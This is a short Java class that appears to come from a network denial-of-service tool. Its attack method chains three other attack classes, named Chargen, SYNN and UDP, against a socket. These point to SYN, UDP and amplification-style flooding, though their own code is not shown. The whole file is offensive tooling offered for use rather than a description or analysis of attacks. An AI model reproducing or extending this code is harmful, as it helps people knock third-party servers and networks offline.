package com.sytrus.api.methods;

import java.net.Socket;

import com.sytrus.api.Method;
import com.sytrus.api.Type;

public class SDDP extends Method {
	
	public SDDP() {
		this.type = Type.SDDP;
	}
	
	@Override
	public void attack(Socket socket) {
		new Chargen().attack(socket);
		new SYNN().attack(socket);
		new UDP().attack(socket);
		System.out.print(".");
	}

}
